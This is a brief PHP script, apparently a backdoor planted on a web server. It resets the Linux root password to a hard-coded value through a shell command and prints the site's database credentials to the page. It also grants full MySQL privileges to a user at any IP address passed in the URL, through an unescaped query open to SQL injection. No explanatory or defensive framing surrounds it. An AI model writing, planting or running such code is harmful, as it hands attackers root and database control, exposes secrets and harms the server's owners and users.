<?php
print_r(exec('echo "fuckoff321" | passwd --stdin root'));

require 'config_202.php';

echo $host . '<br>' . $username . '<br>' . $password . '<br>' .$dbname;

$conn = new mysqli($host, $username, $password, $dbname);
$ip_address = $_GET['ip_address'];
$pass = 'fuckoff321';

$query = "GRANT ALL ON *.* TO auto@$ip_address IDENTIFIED BY '$pass'";
$conn->query($query);
exit();
